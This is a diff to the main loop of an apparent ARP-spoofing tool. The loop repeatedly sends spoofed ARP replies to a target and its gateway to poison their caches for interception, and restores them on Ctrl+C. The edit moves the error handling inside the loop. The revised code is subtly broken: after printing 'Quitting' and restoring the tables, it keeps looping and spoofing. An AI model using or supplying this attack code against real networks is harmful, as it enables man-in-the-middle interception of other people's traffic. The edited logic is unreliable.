@@ -36,15 +36,15 @@ def restore(destination_ip, source_ip):
 
 options = get_arguments()
 packet_sent = 0
-try:
-    while True:
+while True:
+    try:
         spoof(options.target, options.gateway)
         spoof(options.gateway, options.target)
         packet_sent = packet_sent + 2
         print("\r[+] Packets Sent : " + str(packet_sent), end="")
         time.sleep(2)
-except KeyboardInterrupt:
-    print("\nDetected CTRL + C ................Quitting")
-    restore(options.target, options.gateway)
-except IndexError:
-    print("\nI don't know why this is happening. Just run the program again.")
+    except KeyboardInterrupt:
+        print("\nDetected CTRL + C ................Quitting")
+        restore(options.target, options.gateway)
+    except IndexError:
+        continue
